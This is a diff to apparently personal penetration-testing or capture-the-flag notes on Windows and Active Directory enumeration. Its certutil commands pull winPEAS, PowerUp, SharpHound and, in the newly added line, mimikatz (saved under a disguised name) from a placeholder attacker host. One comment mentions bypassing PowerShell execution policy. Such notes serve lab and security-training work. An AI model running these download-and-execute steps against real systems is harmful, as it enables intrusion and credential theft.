@@ -10,10 +10,11 @@ DOWNLOAD THE FOLLOWING FILES. FOLLOW ALL OF THESE DOWNLOADS, GO FOR EASIEST WINS
  - certutil -urlcache -split -f http://<attacker-ip>/winPEAS.exe winPEAS.exe
  - certutil -urlcache -split -f http://<attacker-ip>/PowerUp.ps1 PowerUp.ps1 -- Note: need to run powershell -ep bypass for this to work.
  - certutil -urlcache -split -f http://<attacker-ip>/sharphound.exe sharp.exe -- Note: if ldap isn't enabled bloodhound output will suck.
+ - certutil -urlcache -split -f http://<attacker-ip>/mimikatz.exe kity.exe
 
 Sharphound should hold all of the AD enumeration needed for this box.
 
-After winPEAS enum try this enum techniques.
+After winPEAS enum, and mimikatz, try this enum techniques.
 
 SITUATIONAL AWARENESS
 
